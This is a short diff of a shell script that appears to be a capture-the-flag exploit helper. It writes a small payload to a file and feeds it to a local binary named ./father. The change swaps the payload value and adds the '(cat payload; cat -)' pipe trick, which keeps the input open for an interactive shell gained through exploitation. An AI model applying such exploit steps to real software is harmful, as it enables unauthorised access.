@@ -55,11 +55,11 @@ p64() {
 }
 
 
-v18="3"
+v18="1"
 
 echo -ne $v18 > payload_3_1
 
-cat payload_3_1 | ./father
+(cat payload_3_1; cat - ) | ./father
 
 
 
